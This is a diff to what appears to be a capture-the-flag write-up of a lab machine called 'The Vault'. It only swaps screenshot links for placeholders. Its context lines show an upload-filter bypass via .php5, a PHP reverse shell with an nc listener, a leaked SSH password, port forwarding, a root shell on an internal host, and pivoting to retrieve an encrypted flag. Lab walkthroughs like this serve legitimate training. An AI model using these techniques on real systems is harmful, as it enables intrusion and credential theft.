@@ -17,9 +17,9 @@ sudo nmap -p- --min-rate 1000 -sT -vvv $target
 # Discovered open ports: 22/tcp, 80/tcp
 ```
 
-<img width="438" height="181" alt="image" src="https://github.com/user-attachments/assets/3bb658b3-4932-49be-b076-cc4801f56837" />
+<img width="438" height="181" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="902" height="674" alt="image" src="https://github.com/user-attachments/assets/f4f67855-6bed-41d2-991d-5ffe873a7251" />
+<img width="902" height="674" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 ### Service Enumeration
 ```bash
@@ -31,7 +31,7 @@ sudo nmap -sC -sV -p 22,80 -T4 $target
 # Port 80: Apache httpd 2.4.29
 ```
 
-<img width="770" height="383" alt="image" src="https://github.com/user-attachments/assets/3bbc418f-a231-4c48-9b3e-09611bc4e864" />
+<img width="770" height="383" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 ---
 
@@ -40,7 +40,7 @@ sudo nmap -sC -sV -p 22,80 -T4 $target
 ### Manual Exploration
 - Visited `http://10.129.26.16/`
 
-<img width="949" height="230" alt="image" src="https://github.com/user-attachments/assets/6de7dcf6-9df0-45b0-9507-517e172a85ac" />
+<img width="949" height="230" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 - Discovered references to "sparklays" in page content
 - Manual check of `http://10.129.26.16/sparklays/` - Directory exists!
@@ -60,18 +60,18 @@ gobuster dir -u http://10.129.26.16/sparklays/design \
   -x php,txt,html -t 50 2>/dev/null
 ```
 
-<img width="949" height="453" alt="image" src="https://github.com/user-attachments/assets/1f719494-d2cd-4e3b-98af-33c7f185444b" />
+<img width="949" height="453" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
-<img width="949" height="453" alt="image" src="https://github.com/user-attachments/assets/0d6f87cd-cbe5-4631-9820-590312a2c717" />
+<img width="949" height="453" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 ### Discovered Endpoints:
 - `http://10.129.26.16/sparklays/design/uploads/` - File upload directory
 - `http://10.129.26.16/sparklays/design/design.html` - Design management interface
 - `http://10.129.26.16/sparklays/design/changelogo.php` - Logo upload functionality
 
-<img width="565" height="179" alt="image" src="https://github.com/user-attachments/assets/3bcf1ff6-a36c-43d4-a1ce-85760bb10c2b" />
+<img width="565" height="179" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
-<img width="608" height="173" alt="image" src="https://github.com/user-attachments/assets/a5477afa-ce3c-45e4-9035-c1cfb63147e5" />
+<img width="608" height="173" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 ---
 
@@ -84,7 +84,7 @@ gobuster dir -u http://10.129.26.16/sparklays/design \
 - Tested various PHP extensions: `.php`, `.php3`, `.phtml`, `.php4`, `.php5`
 - **Finding**: `.php5` extension bypassed filters
 
-<img width="658" height="181" alt="image" src="https://github.com/user-attachments/assets/c9fec78f-ba13-4239-bb70-cd809ccd9811" />
+<img width="658" height="181" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 ### Reverse Shell Deployment
 ```bash
@@ -101,7 +101,7 @@ nc -nlvp 9001
 curl http://10.129.26.16/sparklays/design/uploads/revshell.php5
 ```
 
-<img width="929" height="383" alt="image" src="https://github.com/user-attachments/assets/8d97ea97-94c1-4a05-a399-5d9087b5bf0d" />
+<img width="929" height="383" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 **Result**: Reverse shell connection established as `www-data` user
 
@@ -145,7 +145,7 @@ cat ssh
 # Dav3therav3123
 ```
 
-<img width="496" height="305" alt="image" src="https://github.com/user-attachments/assets/12217ec1-4f01-469e-a000-0ca91956994c" />
+<img width="496" height="305" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 ### Internal Network Scanning
 ```bash
@@ -157,7 +157,7 @@ done
 # Results: Ports 22 and 80 open on 192.168.122.4
 ```
 
-<img width="944" height="127" alt="image" src="https://github.com/user-attachments/assets/5ad56c52-6ed3-4892-bbbe-038601b7df6a" />
+<img width="944" height="127" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 ---
 
@@ -170,17 +170,17 @@ ssh -L 80:192.168.122.4:80 dave@10.129.26.16
 # Password: Dav3therav3123
 ```
 
-<img width="549" height="328" alt="image" src="https://github.com/user-attachments/assets/aef0e875-b1ba-4018-895d-e2e3994a9b66" />
+<img width="549" height="328" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 ### Internal Web Application Assessment
 - Accessed `http://127.0.0.1:80` in browser
 
-<img width="661" height="223" alt="image" src="https://github.com/user-attachments/assets/03c1c1ef-848d-4e38-bcdf-0d3ba83e3163" />
+<img width="661" height="223" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
 - Discovered DNS configuration interface
 - **VPN Configuration Page**: `http://127.0.0.1/vpnconfig.php`
 
-<img width="513" height="527" alt="image" src="https://github.com/user-attachments/assets/6e79cae3-a7e0-4530-b2b4-9f95a87b2b0c" />
+<img width="513" height="527" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 - OpenVPN configuration file upload functionality identified
 
@@ -213,7 +213,7 @@ nc -nlvp 1337
 # Shell connection established as root on DNS server!
 ```
 
-<img width="665" height="539" alt="image" src="https://github.com/user-attachments/assets/92923731-7506-43af-9439-9f70d0a465a0" />
+<img width="665" height="539" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />
 
 ---
 
@@ -252,7 +252,7 @@ ping vault
 # Packet loss - routing issue identified
 ```
 
-<img width="679" height="241" alt="image" src="https://github.com/user-attachments/assets/1b8848f8-0655-41df-8615-7054757cb2f8" />
+<img width="679" height="241" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />
 
 ---
 
@@ -271,7 +271,7 @@ ping -c 2 192.168.5.2
 # Success!
 ```
 
-<img width="734" height="313" alt="image" src="https://github.com/user-attachments/assets/22e127dd-4d71-4dda-8f50-b9c70b6a4947" />
+<img width="734" height="313" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />
 
 ### Vault Service Discovery
 ```bash
@@ -283,7 +283,7 @@ done
 # Results: Port 987 open (non-standard SSH)
 ```
 
-<img width="947" height="98" alt="image" src="https://github.com/user-attachments/assets/711c5fc9-0954-4ab2-8806-157d49d3596a" />
+<img width="947" height="98" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-19-Upload-To-Imgur" />
 
 ---
 
@@ -298,7 +298,7 @@ ssh dave@vault -p 987
 # Successfully logged into The Vault system
 ```
 
-<img width="521" height="334" alt="image" src="https://github.com/user-attachments/assets/737da9bb-01b2-4558-bf29-dc2809000797" />
+<img width="521" height="334" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-20-Upload-To-Imgur" />
 
 
 ### Flag Discovery & Extraction
@@ -314,7 +314,7 @@ find / -name root* 2>/dev/null
 scp -P 987 dave@192.168.5.2:~/root.txt.gpg /dev/shm/
 ```
 
-<img width="963" height="565" alt="image" src="https://github.com/user-attachments/assets/2ecb4c16-2ed3-4271-a5de-90fdd9cb35f9" />
+<img width="963" height="565" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-21-Upload-To-Imgur" />
 
 ---
 
@@ -331,7 +331,7 @@ base64 -w0 root.txt.gpg
 echo "hQIMA8d4xhDR6x8DARAAoJjq0xo2bn5JfY3Q6EMVZjkwUK7JPcwUEr1RNUx98k41oOFdtugxUjwHSZ9x9BU9sph696HhlKlPO0au7DeFyxqPFbjR2CdwoT9PBf8vuSEzEqVltvAq31jQbXpUSA2AxYSj3fWKCAkIPcUBTTcJAnac0EMmXlAQzdAmvFEU+9BRkcpJDSpYV8W2IQf+fsnh14hcc5tXZQZX0mPtLlwYVlJq4xgpV3znnJrrlUgKJqkqhq1i2/JEAL5Ul1k5as9Ha1N8KffjmfEsrRQl8TS5NLoC3mVp3w90X0LYhyDcRz7HPzXfdPMdM+G9NEX1zY4c6cr1sxOdLcpUwbZ4itd7XjCA71B23Ncd7eniLGCkErDaVkZh8oa4DyIG78bxqFTDgk6XrH6pz9XRXhDBSZnCezI90WkbxGecOB42cAOwGkuHcnSF44eXDT60Yl9h6bvRZVEQF3/39ee+nMaW5b5PnWzGb/PC4kT3ZDeWYSiloF6a5sOwDO2CL/qipnAFPj8UthhrCCcQj4rRH2zeeh4y9fh3m3G37Q+U9lNgpjzj0nzVCfjdrMRvUs5itxwpjwaxN6q2q1kxe1DhPCzaAHhLT7We7p2hxdSj1yPgefSzJ39GENgJI1fbTDEaMzwkPra4I2MiJCEVgZnV29oRHPYrmGsfx4tSkBy6tJW342/s88fSZAFwRHa6C9Hrr7GSVucoJ5z2kNKAPnS/cUmBc3OdeJlMxdfzQTMucmv89wwgNgKNLO6wmSFppVRnpmLE+AFoCEqg/JS91N5mVhZPkHwW6V94CxMF/3xqTMKpzBfdERq0MGYij98=" | base64 -d > root.txt.gpg
 ```
 
-<img width="955" height="839" alt="image" src="https://github.com/user-attachments/assets/3c95aaf9-b253-40a5-866a-24eaa5b4ec78" />
+<img width="955" height="839" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-22-Upload-To-Imgur" />
 
 ### GPG Decryption
 ```bash
